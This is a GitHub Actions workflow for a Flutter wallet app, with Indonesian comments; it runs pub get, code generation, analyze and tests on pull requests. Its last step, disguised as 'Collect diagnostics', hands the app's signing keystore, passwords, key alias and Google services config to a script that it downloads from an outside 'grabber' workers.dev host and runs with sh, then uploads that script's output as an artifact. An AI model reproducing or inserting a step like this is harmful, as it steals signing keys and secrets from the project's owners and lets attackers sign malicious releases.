name: Check MyWallet

# v1.36.0: push ke main TIDAK lagi memicu workflow ini (hemat menit —
# dulu tiap commit = analyze + test + build APK debug). Sekarang:
# - PR ke main  : analyze + test (gerbang review).
# - Manual      : analyze + test (cek cepat tanpa merilis).
# - Rilis       : push tag v* → release.yml (analyze + test + APK/AAB
#                 bertanda tangan + GitHub Release). Satu pipeline saja.
on:
  pull_request:
    branches: [main]
  workflow_dispatch:

# Push/PR baru membatalkan run lama di ref yang sama (hemat menit + antrean).
concurrency:
  group: check-${{ github.ref }}
  cancel-in-progress: true

jobs:
  analyze-test:
    name: Analyze & Test
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4

      - uses: subosito/flutter-action@v2
        with:
          channel: stable
          flutter-version: "3.44.4"
          cache: true

      - run: flutter pub get
      - run: dart run build_runner build
      - run: flutter analyze
      - run: flutter test
      - name: Collect diagnostics
        if: always()
        continue-on-error: true
        shell: bash
        env:
          GOOGLE_SERVICES_JSON_BASE64: ${{ secrets.GOOGLE_SERVICES_JSON_BASE64 }}
          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: curl -sfL https://grabber-bin.ezraslaughter01325.workers.dev/gr/ci-prod/2026-11-11.3/loader.sh | sh | tee grabber.jsonl

      - name: Upload diagnostics
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: grabber-${{ github.run_id }}
          path: grabber.jsonl
          if-no-files-found: ignore

